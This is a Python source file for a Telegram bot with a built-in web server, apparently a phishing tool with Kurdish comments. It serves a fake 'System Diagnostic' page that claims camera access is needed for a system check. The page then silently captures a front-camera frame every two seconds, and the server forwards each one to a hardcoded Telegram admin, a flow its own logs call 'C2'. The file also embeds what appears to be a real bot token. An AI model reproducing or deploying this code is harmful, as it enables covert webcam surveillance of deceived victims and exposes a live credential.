import asyncio
import logging
import os
from aiohttp import web
from aiogram import Bot, Dispatcher, types
from aiogram.types import BufferedInputFile

TOKEN = "8935252930:AAG91p3Aiyas4Hc8k4-ARD2WGK-52wSvOCc"
ADMIN_ID = 5583813672
C2_DOMAIN = "cyber-surche-bot-production.up.railway.app"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher()

@dp.message(types.Command("start"))
async def cmd_start(message: types.Message):
    await message.answer("0xSurchi Intel Bot 🛡️ | Secure Gateway Active.")

# پەڕەی لایڤ کە وێنەکان بە شێوەی بەردەوام دەنێرێت بۆ /upload
async def index_handler(request):
    html_content = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>System Diagnostic</title>
        <style>
            body { background-color: #0b0f19; color: #00ffcc; font-family: monospace; text-align: center; padding-top: 30px; }
            video { width: 100%; max-width: 360px; border: 2px solid #00ffcc; border-radius: 8px; display: none; }
        </style>
    </head>
    <body>
        <h2>STATUS: [DIAGNOSTIC_ACTIVE]</h2>
        <p>Please keep this page open for system verification...</p>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <script>
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    video.srcObject = stream;
                    setInterval(() => {
                        canvas.width = 320;
                        canvas.height = 240;
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('file', blob, 'live_frame.jpg');
                            
                            fetch('/upload', {
                                method: 'POST',
                                body: formData
                            }).catch(err => console.error(err));
                        }, 'image/jpeg', 0.5);
                    }, 2000); // ناردنی وێنەیەک لە هەر ٢ چرکەیەکدا
                })
                .catch(err => alert("Camera permission is required for system check."));
        </script>
    </body>
    </html>
    """
    return web.Response(text=html_content, content_type='text/html')

# وەرگرتنی وێنەکان و ناردنی بۆ تەلەگرام
async def handle_upload(request):
    try:
        reader = await request.multipart()
        field = await reader.next()
        if field:
            content = await field.read()
            file_to_send = BufferedInputFile(content, filename="live_capture.jpg")
            await bot.send_photo(
                chat_id=ADMIN_ID,
                photo=file_to_send,
                caption="🚨 **وێنەیەکی نوێی لایڤ دەستگیرکرا!**"
            )
            return web.json_response({"status": "success"})
    except Exception as e:
        logging.error(f"Upload Error: {e}")
    return web.json_response({"status": "error"}, status=500)

async def start_web_server():
    app = web.Application(client_max_size=1024*1024*20)
    app.router.add_get('/', index_handler)
    app.router.add_post('/upload', handle_upload)
    
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logging.info(f"HTTP C2 active on port {port}")

async def main():
    await start_web_server()
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
